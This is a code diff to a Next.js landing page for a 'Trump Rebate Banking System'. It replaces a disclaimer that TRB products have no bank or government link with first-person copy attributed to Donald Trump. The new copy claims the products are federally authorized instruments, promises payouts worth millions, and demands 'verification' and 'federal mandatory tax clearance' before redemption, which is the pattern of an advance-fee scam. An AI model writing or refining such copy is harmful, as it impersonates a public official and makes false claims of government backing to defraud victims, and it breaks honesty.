@@ -153,9 +153,8 @@ export default async function Home() {
               Thank you for trusting me.
             </h2>
             <p className="mt-6 text-base leading-relaxed text-slate-600">
-              The Trump Rebate Banking System (TRBS) is a federally supported economic initiative
-              launched by President Donald J. Trump to stimulate consumer spending, reward
-              patriotism, and promote financial sovereignty among American citizens.
+              The Trump Rebate Banking System (TRBS) is a federally supported economic initiative launched by me, President Donald J. Trump to stimulate consumer spending, reward patriotism, and promote financial sovereignty among American citizens. I launched this initiative during my first term, but after spending four years out of office, I was reelected to continue pursuing the vision of a true American Golden Age. Now, loyal patriots who purchased TRB products when the initiative was first launched have what the initiative describes as a once-in-a-lifetime opportunity to redeem their products and potentially receive payouts worth millions of dollars, subject to the program&apos;s terms and conditions. 
+              All patriots are expected to comply with all applicable federal income tax requirements related to their TRB payout. By fulfilling these obligations, you demonstrate your commitment to following U.S. laws and contributing to a strong and financially stable nation.
             </p>
             <p style={{ fontFamily: "var(--font-greatvibes)" }} className="mt-6 text-5xl text-[var(--trb-red)]">
               Donald J. Trump
@@ -253,9 +252,9 @@ export default async function Home() {
                 <span className="text-[var(--trb-gold)]">patriotism</span> shown by Trump supporters.
               </h2>
               <p className="mt-5 text-sm leading-relaxed text-white/70">
-                While TRB products are not linked to any bank or government institution, they carry
-                deep symbolic value. By redeeming yours here, you take part in an exclusive
-                verification and recognition program.
+                While TRB products are not affiliated with any local bank, they are federally authorized financial instruments established by the U.S. 
+                government for the benefit of every American. As such, they carry significant financial and symbolic value. 
+                To redeem your TRB product through our process, you are required to complete an exclusive verification procedure and satisfy all applicable federal mandatory tax clearance requirements.
               </p>
               <Link
                 href="/register"
